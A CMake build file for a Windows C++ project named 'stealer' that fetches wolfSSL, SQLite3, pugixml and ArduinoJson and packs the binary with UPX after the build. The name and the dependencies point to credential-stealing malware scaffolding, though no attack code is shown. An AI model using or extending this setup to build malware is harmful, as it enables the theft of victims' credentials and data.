cmake_minimum_required(VERSION 3.19)
include(FetchContent)

project(stealer)

set(CMAKE_CXX_STANDARD 20)

file(GLOB SOURCES "src/*.cpp")

add_executable(stealer ${SOURCES})
target_precompile_headers(stealer PRIVATE src/pch.hpp)
target_compile_definitions(stealer PRIVATE "$<$<CONFIG:DEBUG>:DEBUG>")

set(BUILD_SHARED_LIBS OFF)

# ArduinoJson to save on size
FetchContent_Declare(ArduinoJson
  GIT_REPOSITORY https://github.com/bblanchon/ArduinoJson.git
  GIT_TAG v7.1.0
)
FetchContent_MakeAvailable(ArduinoJson)
add_definitions(-DARDUINOJSON_ENABLE_STD_STRING=1)
add_definitions(-DARDUINOJSON_STRING_LENGTH_SIZE=4)

FetchContent_Declare(wolfssl
  GIT_REPOSITORY https://github.com/wolfSSL/wolfssl.git
  GIT_TAG v5.7.2-stable
)
FetchContent_MakeAvailable(wolfssl)

FetchContent_Declare(sqlite3
  GIT_REPOSITORY https://github.com/sjinks/sqlite3-cmake.git
  GIT_COMMIT e8d13b331eb328d46c9dc8020de70af9504e207a
)
FetchContent_MakeAvailable(sqlite3)

FetchContent_Declare(pugixml
  GIT_REPOSITORY https://github.com/zeux/pugixml.git
  GIT_COMMIT 30cc354fe37114ec7a0a4ed2192951690357c2ed
)
FetchContent_MakeAvailable(pugixml)

target_link_libraries(stealer wolfssl ArduinoJson SQLite3 pugixml)

FetchContent_Declare(upx URL https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-win64.zip)
FetchContent_MakeAvailable(upx)

add_custom_command(TARGET stealer POST_BUILD
  COMMAND ${upx_SOURCE_DIR}/upx.exe --best --lzma $<TARGET_FILE:stealer> -9q
)
